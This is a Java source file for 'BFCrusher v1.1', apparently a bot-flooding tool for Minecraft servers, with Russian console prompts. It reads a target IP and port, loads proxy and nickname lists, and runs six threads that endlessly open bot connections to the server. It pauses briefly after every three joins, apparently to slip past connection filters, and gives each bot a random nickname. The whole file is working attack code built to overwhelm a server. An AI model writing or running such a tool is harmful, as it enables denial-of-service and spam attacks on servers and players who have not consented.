package ru.justnanix.bfcrusher;

import net.minecraft.init.Bootstrap;
import ru.justnanix.bfcrusher.bot.Bot;
import ru.justnanix.bfcrusher.bot.BotHandler;
import ru.justnanix.bfcrusher.nicks.NicksParser;
import ru.justnanix.bfcrusher.proxy.ProxyParser;
import ru.justnanix.bfcrusher.utils.ThreadUtils;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;
import java.util.Random;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

public class BFCrusher {
    public static final Random random = new Random((long) (System.currentTimeMillis() * Math.random() + System.nanoTime()));

    public static final List<BotHandler> handlers = new CopyOnWriteArrayList<>();

    public static final AtomicBoolean blockConnectionsBF = new AtomicBoolean(false);
    public static final AtomicBoolean blockConnections = new AtomicBoolean(false);
    public static final AtomicInteger botsConnected = new AtomicInteger(0);

    public static final ProxyParser proxyParser = new ProxyParser();
    public static final NicksParser nicksParser = new NicksParser();

    private String host;
    private int port;

    public static void main(String[] args) {
        Bootstrap.register();

        new BFCrusher().start();
    }

    public void start() {
        System.out.println("|| BFCrusher v1.1\n");

        proxyParser.init();
        nicksParser.init();

        String[] ip = {};
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {
            System.out.print("|| Введите айпи: ");
            ip = reader.readLine().split(":");
            System.out.println();
        } catch (Exception ignored) {}

        host = ip[0];
        port = Integer.parseInt(ip[1]);

        loopThreads(6);

        while (true) {
            for (Bot bot : Bot.bots) {
                bot.getController().tick();

                try {
                    ++bot.joinCounter;
                    if (bot.joinCounter == 30) {
                        bot.joinCounter = 0;
                        bot.getWorld().joinEntityInSurroundings(bot.getBot());
                    }

                    if (bot.getWorld().func_175658_ac() > 0) {
                        bot.getWorld().func_175702_c(bot.getWorld().func_175658_ac() - 1);
                    }

                    bot.getWorld().updateEntities();
                    bot.getWorld().tick();
                } catch (Exception ignored) {}

                bot.getNetManager().tick();
            }

            ThreadUtils.sleep(43L);
        }
    }

    private void loopThreads(int max) {
        for (int i = 0; i < max; i++) {
            new Thread(() -> {
                while (true) {
                    if (!blockConnections.get() || !blockConnectionsBF.get()) {
                        BotHandler bot = new BotHandler(host, port);

                        bot.setPriority(10);
                        bot.setDaemon(true);

                        handlers.add(bot);
                        bot.start();
                    }

                    if (botsConnected.get() >= 3 && !blockConnections.get()) {
                        blockConnections.set(true);
                        botsConnected.set(0);

                        for (BotHandler handler : handlers) {
                            if (!handler.joined) {
                                handler.interrupt();
                                handler.stop();
                            }
                        }

                        new Thread(() -> {
                            System.out.println("|| Заблокирована отправка ботов.");

                            ThreadUtils.sleep(10000L);

                            blockConnections.set(false);
                            botsConnected.set(0);

                            System.out.println("|| Разблокирована отправка ботов.");
                        }).start();
                    }

                    ThreadUtils.sleep(120L);
                }
            }).start();
        }

        new Thread(() -> {
            while (true) {
                System.out.println("|| Ботов подключено > " + Bot.bots.size());
                ThreadUtils.sleep(5000L);
            }
        }).start();
    }

    public static String randomNick() {
        StringBuilder builder = new StringBuilder();
        char[] letters = "qwertyuiopasdfghjklzxcvbnm1234567890".toCharArray();

        for (int i = 0; i < 16; i++) {
            if (random.nextBoolean()) builder.append(letters[random.nextInt(letters.length)]);
            else builder.append(Character.toUpperCase(letters[random.nextInt(letters.length)]));
        }

        return builder.toString();
    }
}
